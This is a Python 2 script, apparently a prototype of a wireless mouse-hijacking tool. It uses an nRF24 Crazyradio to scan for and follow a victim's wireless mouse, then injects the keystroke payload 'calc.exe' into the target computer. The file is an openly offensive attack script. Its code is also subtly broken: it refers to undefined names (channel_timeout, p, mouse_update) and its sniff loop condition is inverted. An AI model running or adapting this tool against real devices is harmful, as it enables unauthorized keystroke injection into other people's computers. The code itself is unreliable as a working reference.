#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time, logging, scanner, hid
from lib import nrf24
import os
import click

#some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

__version__ = 0.01

logging.basicConfig(level=logging.INFO, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

attack = "calc.exe\n"

print "MouseSomethingOrOther version %0.2f" % __version__

#make sure we are root
if os.getuid() != 0:
  print R + "[!] " + W + "You need to run as root!"
  exit(-1)

# Initialize the radio
radio = nrf24.nrf24(0)

# Assume Crazyradio PA
radio.enable_lna()

# Create scanner instance
scan = scanner.scanner(radio)

# Channel timeout in seconds
timeout = 0.1
sniff_timeout = 1.0

# Enter main loop
try:
  while True:
    print G + "[+] " + W + 'Scanning...'
    address, payload = scan.scan()

    if len(payload) == 19 and payload[1] == 0x90:

      last_ping = time.time()
      last_packet = time.time()
      scan.sniff(address)
      mouse = hid.mouse(radio, address)
      mouse.update(payload)

      while time.time() - last_packet > sniff_timeout:
        
        # Follow the target device if it changes channels
        if time.time() - last_ping > channel_timeout and mouse.pingable:
          if scan.follow():
            last_ping = time.time()

        # Receive payloads
        value = radio.receive_payload()
        if value[0] == 0:

          # Reset the follow timer
          last_ping = time.time()

          if len(payload) == 19 and p[1] == 0x90:
            
            # Reset the packet timer
            last_packet = time.time()

            # Split the payload from the status byte
            payload = value[1:]

            # Update the payload
            mouse_update(payload)
      
      mouse.send_attack(attack)
except KeyboardInterrupt:
  print '\n ' + R + '(^C)' + O + ' interrupted\n'
